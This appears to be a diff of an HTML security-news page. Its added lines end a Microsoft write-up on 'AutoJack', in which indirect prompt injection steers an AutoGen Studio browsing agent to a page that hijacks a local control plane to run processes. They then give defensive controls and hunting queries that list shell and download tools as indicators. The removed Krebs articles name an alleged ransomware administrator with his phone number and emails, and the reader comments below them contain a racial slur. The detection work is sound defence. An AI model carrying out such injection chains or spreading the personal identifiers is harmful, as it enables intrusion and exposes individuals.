+Azure AI Content Safety Prompt Shields detects user prompt injection and indirect prompt injection (cross-prompt injection attack, or XPIA), which can catch an early stage of this chain when attacker-controlled content steers an agent to navigate to a malicious page. Prompt Shields do not intercept the client-side JavaScript execution that follows, but they provide an early interception point when initial navigation is triggered through indirect prompt injection. Prompt Shields also integrate with Defender for Cloud AI threat protection so the security operations center (SOC) can see this signal.
+Microsoft Defender for Cloud Threat Protection for AI Services raises alerts on jailbreak, data leakage, and credential theft patterns observed against Azure-hosted models, including models used by AutoGen agents when routed through Azure AI services.
+Microsoft Defender for Cloud AI Security Posture Management (AI-SPM) builds an AI bill of materials (AI BOM), scans infrastructure as code (IaC) and container dependencies for vulnerable AI components, and runs attack path analysis. This helps inventory where AutoGen Studio, or similar prototypes, is deployed across cloud and developer environments.
+Microsoft Foundry AI Red Teaming Agent and the open-source PyRIT automate adversarial probing for indirect prompt injection, prohibited actions, and sensitive data leakage. Run these tools against your own agent prototypes before allowing them to browse the open web.
+At the endpoint (catch the spawn and the post-exploitation)
+Microsoft Defender is a high-leverage control for this chain. The AutoJack primitive ends with a Python or Node parent process spawning an unexpected child process through StdioServerParams, which matches the behavioral pattern that endpoint detection and response (EDR) and automated investigation and response (AIR) are designed to catch.
+Network Protection and Web Content Filtering and custom IP, URL, and domain indicators can block the headless browser from reaching known malicious sites. They can also let you blackhole an attacker domain across the fleet after identification, provided that headless browser traffic is routed through the operating system network stack inspected by Network Protection.
+Microsoft Defender Vulnerability Management software inventory helps locate machines running vulnerable versions of agent frameworks. One caveat is that pip-installed Python packages might not always appear in standard inventory parsers, so hunt for them through process and file telemetry as well.
+Identity, network, and data containment
+Microsoft Entra Conditional Access gates source, cloud, and tenant access based on risk signals including compliant device, compliant network and agent risk, which blocks access in real-time. Privileged Identity Management (PIM) helps keep admin tokens out of standing reach and limits blast radius if a developer workstation is compromised.
+Microsoft Entra Agent ID extends familiar Microsoft Entra capabilities to AI agents and treats agents as a first-class identity. It brings together identity management, access protection, governance, and compliance controls to manage, govern, and protect AI agents. This reduces the blast radius of confused-deputy attacks such as AutoJack by ensuring agents operate under distinct governed identities rather than inheriting a developer’s ambient privileges.
+Microsoft Defender detects and helps contain lateral movement and credential abuse if an attacker pivots from a compromised workstation into Active Directory (AD) or Microsoft Entra.
+Hardening the dev environment itself
+Microsoft Dev Box provides cloud-hosted, IT-managed developer workstations with Intune, Conditional Access, and Microsoft Defender for Endpoint by default. It is a structurally safer place to run experimental AutoGen builds than a personal laptop. Windows Sandbox, generally available on Pro, Enterprise, and Education editions, is a lightweight equivalent for one-off experiments. A successful AutoJack-style remote code execution (RCE) event is contained within the sandbox and discarded when the sandbox closes.
+Microsoft Defender for Cloud DevOps Security (general availability, or GA), together with GitHub Advanced Security capabilities such as Dependabot, secret scanning, and CodeQL, helps surface vulnerable framework versions pinned in repository manifests and detect credentials that workstation remote code execution could exfiltrate from source code.
+Investigation and response
+Investigation and response
+Microsoft Defender advanced hunting is where the queries below run. Use Microsoft Security Copilot to summarize incidents, generate Kusto Query Language (KQL), and triage alerts produced by the controls above.
+Microsoft Defender detections
+Organizations can use the hunting queries below to identify suspicious child-process creation and related activity consistent with this technique on hosts running AutoGen Studio, then investigate and contain as appropriate.
+Advanced hunting queries
+Use these Microsoft Defender advanced hunting queries to look for the AutoJack chain on hosts running AutoGen Studio. Tune the time range and process names for your environment.
+1. Suspicious children spawned by an autogenstudio host process
+DeviceProcessEvents | where Timestamp > ago(30d) | where InitiatingProcessCommandLine matches regex @"(?i)autogenstudio|autogen[\s_\-]?studio" or InitiatingProcessFolderPath matches regex @"(?i)autogenstudio" | where FileName in~ ( "cmd.exe", "powershell.exe", "pwsh.exe", "bash.exe", "wsl.exe", "certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "curl.exe", "wget.exe", "bitsadmin.exe" ) | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | sort by Timestamp desc |
+2. WebSocket reach-outs to the AutoGen Studio MCP control plane carrying server_params
+This is most useful when paired with a network sensor that surfaces local WebSocket upgrade requests, but it can also be approximated by using process command lines that construct the URL manually.
+DeviceNetworkEvents | where Timestamp > ago(30d) | where RemotePort in (8081, 8080) | where RemoteUrl has "/api/mcp/ws/" and RemoteUrl has "server_params=" | project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl | sort by Timestamp desc |
+3. Browser-automation hosts navigating to non-corporate domains during an AutoGen Studio session
+DeviceProcessEvents | where Timestamp > ago(30d) | where InitiatingProcessFileName in~ ("python.exe", "pythonw.exe", "node.exe") | where InitiatingProcessCommandLine has_any ("playwright", "MultimodalWebSurfer", "autogen") | join kind=inner ( DeviceNetworkEvents | where Timestamp > ago(30d) | where not(RemoteUrl has_any("microsoft.com", "msft.net", "office.com", "<your-corp-domains>")) | project DeviceName, InitiatingProcessId, RemoteUrl, Timestamp ) on DeviceName, $left.ProcessId == $right.InitiatingProcessId | project Timestamp, DeviceName, AccountName, ProcessCommandLine, RemoteUrl | sort by Timestamp desc </your-corp-domains> |
+If any of these queries surface activity during a period when AutoGen Studio was running with a browsing or code-execution agent, treat the host as a potential development-environment compromise. Review the host, rotate developer credentials and tokens accessible from it, and check whether anything was written to autostart locations.
+What this means for the broader agent ecosystem
+AutoJack is less interesting because of its individual bugs, each of which is a reasonable shortcut in a research-grade prototype, and more interesting because of the chain’s overall shape. We expect to see the same pattern across the ecosystem:
+- A development tool exposes a powerful local control plane.
+- That control plane is protected by an origin or localhost-only assumption.
+- The user routinely runs an agent on the same machine, and that agent is willing to render arbitrary web content.
+That triangle dissolves the localhost trust boundary. The durable response is to authenticate and authorize every control plane regardless of origin, allowlist dangerous primitives such as process execution, file write and network egress, and isolate agent identity from developers identity.
+AutoJack shows that localhost is no longer a trust boundary when agents can browse untrusted content and interact with privileged local control planes. The durable defense is consistent with control-plane authentication and authorization, strict allowlisting of high-risk actions, and identity isolation between agents and developers.
+This research is provided by Microsoft Defender Security Research, Shaked Ilan, and with contributions from members of Microsoft Threat Intelligence.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+- Explore
+[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
+[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime)</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-8" class="article-body">
-            <h2 class="article-title">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/scattered-spider-hackers-plead-guilty-on-day-1-of-trial/" target="_blank">Original Link</a></p>
-            <div class="content-text">Two men pleaded guilty in the United Kingdom this week to criminal charges stemming from an August 2024 cyberattack that crippled Transport for London, the entity responsible for the public transport network in the Greater London area. The duo were key members of a prolific cybercrime group known as Scattered Spider, and their guilty pleas came on the first day of what was expected to be a six-week trial.
-Thalha Jubair, 20, of East London and 18-year-old Owen Flowers of Walsall admitted conspiring to commit unauthorized acts against Transport for London computer systems and causing risk of serious damage to human welfare. According to [a report](https://www.bbc.com/news/articles/czx5yp9qy0do) from the BBC, Flowers alone admitted to being part of a conspiracy to hack into U.S. based healthcare providers SSM Health Care Corporation and Sutter Health in September 2024.
-Jubair is also wanted by U.S. law enforcement agencies. In September 2025, prosecutors in New Jersey unsealed [an indictment](https://www.justice.gov/opa/pr/united-kingdom-national-charged-connection-multiple-cyber-attacks-including-critical) alleging Jubair and other Scattered Spider members committed computer fraud, wire fraud, and money laundering in relation to 120 computer network intrusions involving 47 U.S. entities between May 2022 and September 2025, and that the group’s victims paid at least $115 million in ransom payments.
-In July 2025, KrebsOnSecurity [reported](https://krebsonsecurity.com/2025/07/uk-charges-four-in-scattered-spider-ransom-group/) that Flowers and Jubair were arrested in the United Kingdom in connection with Scattered Spider [ransom attacks](https://www.thetimes.com/uk/technology-uk/article/ransoms-hackers-cyber-crime-t5kjldwwm) against the retailers Marks & Spencer and Harrods, and the British food retailer Co-op Group. Multiple sources familiar with those investigations said Flowers was the Scattered Spider member who anonymously [gave interviews to the media](https://krebsonsecurity.com/2024/09/the-dark-nexus-between-harm-groups-and-the-com/) in the days after the group’s September 2023 ransomware attacks disrupted operations at Las Vegas casinos operated by MGM Resorts and Caesars Entertainment.
-According to prosecutors, Jubair co-ran a bustling Telegram channel called Star Chat, the home of a [SIM-swapping](https://krebsonsecurity.com/?s=SIM-swapping) group that used voice- and SMS-based phishing attacks to steal credentials from employees at the major wireless providers in the U.S. and U.K. The group would then use that access to sell a service that could redirect a target’s phone number to a device the attackers controlled and intercept the victim’s calls and text messages (including one-time codes for multi-factor authentication).
-New Jersey prosecutors also allege Jubair also was involved in a [mass SMS phishing campaign during the summer of 2022](https://krebsonsecurity.com/2022/08/how-1-time-passcodes-became-a-corporate-liability/) that stole single sign-on credentials from employees at hundreds of companies. That weeks-long SMS phishing campaign led to intrusions and data thefts at more than 130 organizations, including LastPass, DoorDash, Mailchimp, Plex and Signal.
-KrebsOnSecurity reported last year that one of Jubair’s alter egos at age 15 was “Everlynn,” a hacker who sold [fraudulent “emergency data requests”](https://krebsonsecurity.com/?s=fake+edr) that used compromised police and government email addresses to demand subscriber data (e.g. username, IP/email address) from major tech companies, claiming the requests concerned urgent matters of life and death and could not wait for a court order.
-In April 2026, 24-year-old British national and Scattered Spider member Tyler “Tylerb” Buchanan [pleaded guilty](https://krebsonsecurity.com/2026/04/scattered-spider-member-tylerb-pleads-guilty/) to wire fraud conspiracy and aggravated identity theft for participating in the group’s SMS phishing spree in the summer of 2022. The government said Buchanan, Jubair and others used the credentials harvested in that phishing campaign to steal at least $8 million in cryptocurrency from victims throughout the United States. Buchanan is currently scheduled to be sentenced on October 2.
-In August 2025, 20-year-old Scattered Spider member from Florida named Noah Michael Urban was [sentenced to 10 years in federal prison](https://krebsonsecurity.com/2025/08/sim-swapper-scattered-spider-hacker-gets-10-years/) and ordered to pay $13 million in restitution, after pleading guilty to charges of wire fraud and conspiracy.
-The U.S. Department of Justice says three alleged Scattered Spider defendants indicted along with Buchanan still face charges, including Ahmed Hossam Eldin Elbadawy, 24, a.k.a. “AD,” of College Station, Texas; Evans Onyeaka Osiebo, 21, of Dallas, Texas; and Joel Martin Evans, 26, a.k.a. “joeleoli,” of Jacksonville, North Carolina.
-Flowers and Jubair are slated to be sentenced in a London court on July 15, 2026.
-More stupid young people throwing their lives away.
-Smart young adults potentially throwing their future away. Sigh…
-A friend of my nephew is a 23 year old guy with obvious talent who seems to be uninterested in a job.
-I think he wants me to retire and has the idea that he can take my job. However, he has neither the knowledge nor the temperament to do the job. He’s too much of a hothead and thinks that he knows absolutely everything about everything, especially computers and electronics.
-For example, when he first came to town, he was helping my nephew run a cable in someone’s house. They ran three cables and couldn’t get any of the runs to work. He claimed the cable was rotten, that the connectors were bad, and that the cable tool was broken. There was nothing wrong with any of that — the issue is with his own arrogant belief that nothing is ever his fault.
-He is not my employee — he has too many red flags for me to consider him for a job.
-Nah, no ‘ccomplices.
-What must their parents think?
-Should we expect more arrests soon?
-While it is difficult to trace many spammers and scammers through the cyberlabyrinth of the WWW, it is heartening to see that over time, more of these lost souls are being caught.
-The sad thing is that so many of them are still kids. The question of what their parents must think makes me wonder if they were even present at all. Parenting usually involves some kind of monitoring to see what your kid is doing online for so long before they get to the age these doofuses are at, where they inevitably make some kind of mistake and get caught. They are old enough now to know better… and to face the consequences as well.
-…parents just need to tell their kids “don’t be a f***ing thief!”. Say it enough times and they’ll get it. Teach the basics of morality.
-Hello, Brian:
-If I recall, you said that Scattered Spider has a robust, large recruiting base. From what I remember, less than a dozen of them have been apprehended, and most of them were not high-level members, although from what I can garner from your site and a few others, the Vegas ransomings were particularly treacherous.
-Do you have any idea what the current rough count is of active members, according to the threat researchers? I am guessing most of its ersatz members don’t know much about any of the others so I doubt previous models to round em all up would work.
-The catch all name seems kind of deceptive, especially to C-level types who don’t even get they can be ransomed months later by other people that most reporters and companies might call the same group. Are they really?
-Thanks.
-I don’t think the courts and laws have caught up with what should be more severe penalties for cyber crimes; they don’t quite get the blast radius of the infractions. Kids on the street stealing far far less and effecting almost no one, often get much harsher sentences in comparison.
-They are more connected than people think. Just like the jellyfish-like drone swarms. I wouldn’t be so quick to assume they aren’t mutually aware, like some effed up MUFON.
-Hacking sure wasn’t like that fifteen years ago.
-And wouldn’t you know it they wanted fictional time machines then also.
-“Throwing their lives away” to be future security consultants when they do their face turn.
-Nah, the world doesn’t work like that usually anymore, and there are plenty of folks straddling that line that didn’t get caught left to hire. Assuming there is even an equivalent skill set in demand five, eight, ten, whatever years from now. Not saying they can’t have a life after sentencing, just that the time of the convicted felon wunderkind with a future in a field demanding trust, as a given, is long gone.
-Check, garçon!
-The TFL hack started on 31st August, and Flowers was arrested for it on 6th September. So clearly no opsec skills. They had to plead guilty as the evidence included videos and screenshots that these idiots had saved to their own personal devices.
-I always wonder what role the parents play in having teenagers who engage in this criminal activity. These kids reap huge financial rewards – don’t the parents see that? Are they really that clueless? Perhaps they should share some of the responsibility for all the harm their child causes others.
-Juvenile computer crime and hacking recidivism rates aren’t generally tracked so I also wonder how many commit post-incarceration crimes.
-WELCOME TO BACOB JUTLER CAFE!
-FREE MY NIGGA DORT HE AINT DONE NOTHNIN
-These two upstanding citizens have a bright future in the Trump organization, Big-Balls better watch out for these two. And I don’t see them being on many dates with girls either, but getting beat up by girls yes 😉
-Shouldn’t this sort of post be on something like t4r4ñt3lla.onion or something, not this site?</div>
+            <h2 class="article-title">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/how-to-train-your-dragons-analysts" target="_blank">Original Link</a></p>
+            <div class="content-text">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team
+Whether it be the advent of AI technologies, new Red-Team techniques and exploits, or new patches and emergent defensive technologies, it’s pretty clear to all of us operating within technology fields that the landscape of computing and cyber-security is ever evolving.
+In order to stay up to date with all that’s going on, the TrustedSec Purple Team has been hard at work renovating and improving our assessments to better service the needs of our clients and the broader security community.
+This blog post will walk you through the types of Purple Team assessments that we offer, how to choose the assessment that will meet your security team where they are, and offer the best path forward to improvement.
+TrustedSec Engagement Overview
+Live Fire Exercise (LFX)
+The Live Fire Exercise is an active testing engagement in which TrustedSec consultants execute a pre-designed playbook of attack scenarios within your environment, and then, in tandem with the client’s Blue Team, leverage the generated telemetry to test, validate, and evaluate logging within the clients defensive tooling (EDR, SIEM, IDPS).
+The LFX comes in two models: live bootcamp style assessments, and ad-hoc assessments which allow TrustedSec consultants to perform the same work, but with more scheduling flexibility.
+Detection Validation and Review Assessment (DVR)
+The Detection Validation and Review Assessment is another active testing style assessment that targets a specific and defined list of client-built detections.
+In this ad-hoc style engagement, TrustedSec will test and validate that existing detections can fire and will provide tangible recommendations to improve logic or recommend additional detections if a gap in coverage is identified.
+Defense Validation and SIEM Ingestion Review (DVSIR)
+TrustedSec's Defense Validation is a structured assessment designed to quantify the effectiveness of an organization's defensive controls. The engagement begins with a Detection and Alerting Interview, where consultants collaborate with the organization to identify its primary security goals, high-priority systems, and business-critical data. A SIEM Configuration Review is then performed to assess whether the organization’s SIEM has sufficient visibility into environmental logging, aiming to reduce unnecessary event logging to maximize the usability of the SIEM.
+Adversarial Detection and Countermeasures Engagement (AD&C) and General Variants
+The AD&C assessment features live attack scenario execution and custom, high-fidelity detections written directly within your SIEM or EDR platform. We also evaluate the security posture surrounding those scenarios and provide tangible guidance for how to improve.
+This exercise comes in two models: live bootcamp style assessments, or an ad-hoc assessment.
+To tailor your experience, we also offer multiple AD&C Assessment variants, such as:
+- Phases: Our standard playbooks. A great place to start if you’re new to working with us.
+- MITRE Focused: Know your environment? If there are specific gaps pertaining to a specific phase of the MITRE framework (e.g. Lateral Movement, Discovery), this is a great assessment for having a more targeted evaluation of the problem area.
+- Cloud: Looking for detection engineering for AWS, GCP, Azure- or other cloud platforms? This is the right assessment for you!
+- Blue Team Guidance: Looking to review and cover gaps from an existing pentest or Red Team? This assessment focuses on walking through key techniques and issues from the report, leveraging the work that has already been done to close existing gaps in detection or prevention.
+- ADS: Want an AD&C but don’t have the time or budget for a large-scale assessment? This variant is limited in scope but is an excellent choice for clients who may wish to test out and see if this type of assessment will meet their needs, or for those who need an accelerated timeline.
+- Ransomware Resilience: A shorter, ransomware focused assessment that seeks to identify and cover detection gaps for common ransomware techniques.
+Threat Emulation Assessment (TEA)
+A threat emulation is a more advanced assessment wherein TrustedSec will design a custom threat emulation based on a specific Threat Group, execute the scenario, and ensure that proper detection capabilities exist for each step in the attack sequence.
+Deception Engineering and Implementation Engagement (DEIE)
+The DEIE engagement is another advanced assessment for clients looking to design and implement deception technologies and accompanying detections within their environments.
+In this assessment, clients can choose from pre-built deception technologies per technology stack, or work with TrustedSec consultants to design custom deceptions for a platform of their choosing.
+SOC Response Training
+The SOC-RT assessment is a hybrid, interactive tabletop training exercise that provides practical hands-on exercises for your defensive team. In this assessment, a series of attack sequences will be executed in your environment and guided exercises will walk your SOC through investigative logic and solutions, with an attack scenario live demonstration and subsequent investigative discussion after each exercise.
+How to Pick your Perfect Match
+Now that you have a solid idea on each of our offerings, let’s talk about how to choose the Purple Team assessment that will get you and your security team the best value.
+Where to Start
+For clients who may not know where to start their journey, or would like help better understanding their environment, logging, and existing detection capabilities, we highly recommend starting with a Defense Validation and SIEM Ingestion Review (DVSIR) or a Live Fire Exercise (LFX).
+A DVSIR will help you identify critical assets and existing technologies through inquiry style testing and then evaluate your current SIEM to provide recommendations on existing logging structure and how to get the most out of your SIEM.
+A Live Fire Exercise will then test logging directly with real world attack scenarios to ensure that you have the needed telemetry in place to be able to detect them.
+Where to Go Next
+For those clients who have a strong idea of their defensive tooling and logging infrastructure, we highly recommend one (or more!) of the next three assessment types.
+If you’re looking for a detection building engagement, look no further than our AD&C assessments. This will provide attack demonstrations, knowledge transfer from consultant to security teams, and will feature custom detection engineering that will be implementation ready by the end of the assessment.
+Alternately, if you’re looking to improve existing detections, try our Detection Validation and Review Assessment. In this assessment, we will test your existing detections, recommend improvements in logic, and identify any gaps that may be present.
+Or, if you’re looking to help augment and test your Defensive teams’ skills, try a SOC Response Training exercise.
+For the Advanced Security Teams Among Us
+If you’re looking for something new to enhance your security program, why not try a Threat Emulation Assessment, or our Deception Engineering assessment? Both of these assessments look to improve your defenses in ways that go beyond basic or intermediate level testing.
+Your Adventure at a Glance:
+It’s also possible to view our assessments through the following lenses:
+- Detection Engineering Assessments
+- Active Testing Assessment, and;
+- Level-Up Assessments
+The graphic below gives a quick overview of the assessment, and which categories they fall into.
+In addition to all the engagement styles we offer above, we are always more than happy to sit down and chat about the security posture of your organization. If something above doesn’t match what you’re looking for, let us know! We also offer customized approaches that may better suit your team’s needs.
+Conclusion
+Picking the right Purple Team assessment for your organization can be a challenging endeavor, whether it be identifying a starting point, or putting together a roadmap for next-steps. TrustedSec’s account managers and consulting team have the skills and expertise to provide actionable guidance to assist your organization at all stages of its journey. If you have questions or are interested in these services, please [get in touch with us](https://trustedsec.com/contact)!</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-9" class="article-body">
-            <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
-            <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
-Experts at the security firm Check Point Software have been closely covering exploits of The Gentlemen, a so-called “ransomware-as-a-service” (RaaS) offering that pays affiliates handsomely to help spread the group’s malware.
-“A 90/10 affiliate revenue split — compared to the industry standard 80/20 — is accelerating the group’s growth by attracting experienced operators from competing programs,” the researchers wrote in April.
-Check Point [found](https://research.checkpoint.com/2026/thus-spoke-the-gentlemen/) The Gentlemen are the second most active ransomware group by victim count so far this year, claiming at least 332 published victims since the group’s inception in mid-2025 and more than 240 in 2026 alone.
-According to Check Point, the group targets Internet-facing devices (VPNs, firewalls) as their entry point, and once inside moves quickly to encrypt entire networks within hours.
-Check Point says the administrator and primary operator of the ransomware group uses the nickname Zeta88 on the Russian-language cybercrime forums, and that this individual was previously known under the moniker Hastalamuerte. Check Point noted that [a breach](https://www.kelacyber.com/blog/the-gentlemen-ransomware-internal-chat-leak-analysis-2026/) of the group’s backend infrastructure made it clear that Hastalamuerte/Zeta88 is the person who assembles the locker and RaaS panel, manages payments, and is essentially the administrator of the entire program who receives 10 percent of all ransoms.
-WHO IS HASTALAMUERTE?
-The cyber intelligence firm Intel 471 shows that the user Hastalamuerte is a Russian and English speaking person who registered on almost a dozen cybercrime forums between 2019 and the present day, including Exploit, Breachforums, Ramp_V2, BHF, Raidforums, and Nulled.
-Intel 471 reveals that Hastalamuerte registered on Breachforums in January 2025 from an Internet address in Izhevsk, the capital city of Russia’s Udmurt Republic. Likewise, the user Zeta88 signed up at the English-language cybercrime forum Breached in August 2022 from a different Internet address in Izhevsk.
-Intel 471 finds Hastalamuerte registered on Raidforums in 2020 using the email address hastalamuerte1488@protonmail.com (1488 is a common combination of [two numeric symbols associated with white supremacy](https://en.wikipedia.org/wiki/Fourteen_Words)). A lookup on this address at the open source intelligence service Epieos shows it is connected to an account at Apple and to a phone number ending in 04.
-Epieos says that Protonmail address is also linked to a GitHub account under the username SantaMuerte. That account is marked private, but [a history of this user’s activity](https://connectionrequired.com/gitspective/#/timeline/SantaLaMuerte) shows they are watching and developing a number of malware tools and exploits.
-In April 2020, Hastalamuerte said on the crime forum Nulled that they could be contacted at the Telegram instant messenger name @hastalamuerte18, and the threat intelligence company Flashpoint finds this username is assigned the unique Telegram ID number 30907522 [full disclosure: Flashpoint is an advertiser on this blog].
-The breach tracking service Constella Intelligence reports that Hastalamuerte’s Telegram ID is connected to another username — “bu4vs” — and to the Russian phone number 79127650004. Pivoting on this phone number in Constella fetches multiple records from hacked Russian government databases showing it is assigned to one Alexander Andreevich Yapaev, a 36-year-old from Izhevsk.
-Constella reveals that phone number was used to create an account at the Russian social media platform Pikabu under the name “4apai18,” and shows Mr. Yapaev has signed up at a number of websites using the common surname [Ivanov](https://x.com/bu4vs/status/235798656769470465), or else “Chapaev” (the numeral 4 is often used as shorthand for a “ch” sound in Russian).
-A search in Intel 471 for cybercrime forum members with the nickname SantaMuerte unearths an account by the same name created in 2020 on the Russian hacking forum Codeby. Intel 471 shows this user originally registered on Codeby with the not-so-subtle nickname Alexandr 4apaev.
-Constella finds Mr. Yapaev regularly used the email address bu4vs@mail.ru. Meanwhile, Epieos shows this address is connected to a [LinkedIn account](https://www.linkedin.com/in/yapaev/) for Alexander Yapaev, who lists himself as the head of B2B marketing at the company Uralenergo Udmurtia, one of Russia’s largest suppliers of electrotechnical and lighting products.
-Mr. Yapaev did not respond to multiple requests for comment.
-Nearly every time we publish one of these [Breadcrumbs stories](https://krebsonsecurity.com/category/breadcrumbs/), readers are curious to know why it seems like so many cybercriminals from Russia apparently do little to hide their real life identities. The truth is that — Russian or not — most didn’t exactly set out to be arch criminals, but instead got drawn into the scene gradually over several years as their skills broadened and sharpened.
-Another important dynamic is that the Russian government generally either [co-opts or ignores](https://www.recordedfuture.com/research/dark-covenant-3-controlled-impunity-and-russias-cybercriminals) cybercriminal activity within its borders so long as the hackers do not steal from or attack Russian businesses and citizens. As a result, successful cybercriminals in Russia are usually insulated from prosecution and arrest by foreign law enforcement agencies provided they occasionally pay off the right people and do not travel abroad. And cybercriminals who intend to strictly adhere to those unwritten rules may (at least initially) be less concerned about covering their tracks online.
-But the simplest explanation is that cybercriminals of all nationalities tend to make a number of basic operational security mistakes early in their careers, when they are less savvy and have far less to lose by their carelessness. A review of Hastalamuerte’s early posts on the crime forums (circa 2019-2020) shows a relatively unsophisticated and low-skilled hacker still trying to learn the ropes and earn a positive reputation on these communities.
-For example, in June 2020 Hastalamuerte’s Telegram account joined a multi-month training program (@pntst) to learn how to use popular penetration testing tools, and their candid posts to this hacker training camp show Hastalamuerte struggling to use these tools effectively. A Google-translated record of Hastalmuerte’s posts to @pntst is [here](https://krebsonsecurity.com/wp-content/uploads/2026/06/pntst-chat.txt).
-Update, June 11, 10:23 a.m. ET: The threat research group PRODAFT has released [a detailed writeup](https://catalyst.prodaft.com/public/report/inside-the-phantom-mantis-operation/overview#paragraph-1077|172) on the history and current operations of The Gentlemen. PRODAFT said its findings match the same persona with “high confidence,” and found the administrator (Zeta88/Hastalamuerte) supplies affiliates with initial access directly, primarily Fortinet SSL-VPN credentials obtained through brute-force attacks or sourced from the group’s own leak database. They also discovered the administrator is using AI to develop and maintain the ransomware and associated tooling, as well as to assist with post-exploitation activity.
-True operational secrecy is a pain in the butt, hard to maintain, and easy to screw up. That’s why it’s better to be able to act in your real name and not have to worry about it…
-It’s amazing how these ransomware gangs are able to maintain military intelligence level opsec
-Almost as if…
-Um, almost as if their business model provides enough income to afford it? Enough with the conspiracy theories. Brian understands that most of these sorts of operations have a learning curve. They are most vulnerable at three or four times in each ransom cycle (three, if it is an established affiliate relationship for long enough to have ascertained they aren’t involved in a sting). Once they figure out how to proxy, manage their toolchain properly, and successfully get ahold of the money they asked for, the only thing left to worry about is how to make it look legitimate. Ransomware removes the long-term upkeep and gradual profit model of a botnet. Now that companies are willing to pay hundreds of thousands or millions per incident, you don’t need to be ‘Russian’ or ‘Ukrainian’, or have connections to any sort of corrupt officials, you just have to throw someone else under the bus faster than the other person, it looks like.
-‘able to maintain military intelligence level opsec’
-Some of them are run by military intelligence in various countries, some of those are very good at it.
-I don’t think that’s amazing, unbelievable or improbable, nor is it a conspiracy theory. It lines up fine.
-If you’re trying to imply a _particular_ gang or campaign is run by mil.ops, that requires specificity.
-Vague implications are like…
-Has anyone told Apple about “Hastalamuerte registered on Raidforums in 2020 using the email address hastalamuerte1488@protonmail.com (1488 is a common combination of two numeric symbols associated with white supremacy). A lookup on this address at the open source intelligence service Epieos shows it is connected to an account at Apple and to a phone number ending in 04.”
-Can they disable his account?
-I don’t see why. He’s not infringing on any of Apple’s terms with his account, nor has he attacked Apple. Simply *being* a criminal shouldn’t get you disbarred from using any services.
-“He’s not infringing on any of Apple’s terms with his account, nor has he attacked Apple.”
-That _you_ know of? It’s improbable that nobody connected to Apple whatsoever was targeted.
-I’ve not recently deep-read Apple’s EULA but I’d think *being a criminal* is in there somehow…
-lol
-Hats off, GENTLEMEN, to Brian Krebs!
-It’s funny. When I start reading it, I thought to myself, “Russian?” And sure enough. It is.
-I think the reason it’s so easy to track there people down (aside from the Russian government letting them do it as long as the victims are in the West and that’s why they don’t care about hiding) is because most of those “hackers” are just plain stupid low lives. Otherwise anyone that had two brain cells had already left that nasty country.
-@Dennis – I think if you have money, are careful and discreet, and stay out of politics… Russia can be a veery pleasant place to live.
-Hmmm. Never seemed to work for Arkady Renko.
-I live next to Russia. I have friends and ex-colleagues in Russia (we had a branch office in Moscow). I speak Russian, I read Russian literature, I liste n to Russian music.
-No it is not pleasant place to live. Perhaps if you are very rich so you can live in a secure enclave.
-There is
-– corruption, being a daily part of the society on all levels
-– crime, the same, being constantly present in all places
-– censorship and surveillance
-– cynicism that permeates everything
-The company ended up dismantling the Moscow office and relocating the staff, on company expenses, to Central Europe.
-A bank that I worked for tried to expand to Russia. It backed off after a few years – the corruption was unmanageable.
-Russia has great nature, great culture, and the people are friendly and welcoming. But as a place to live – no, it is not pleasant at all.
-I think it most definitely matters where in Russia (or let’s be honest, here, what country near Russia) you are taking about. I think it is dangerous to confuse “low corruption” with “a different sort of corruption”, also. It is shocking how many ignorant people think Ukraine is or was less corrupt, for instance, or really, most any country in Central or Eastern Europe. Might make more sense to judge corruption by whether you wind up getting what you paid for (be it in money, favour, or just looking the other way). Some “corrupt” places, you get treated more fairly than some places people deem ‘fair’. Better a mechanism to work around corruption and bias, to some people, than no recompense or recourse. It might cost, but better that than no alternative.
-“Nasty country” – pray tell where you’ve found so entirely free of nastiness to live, Mr. Menace?
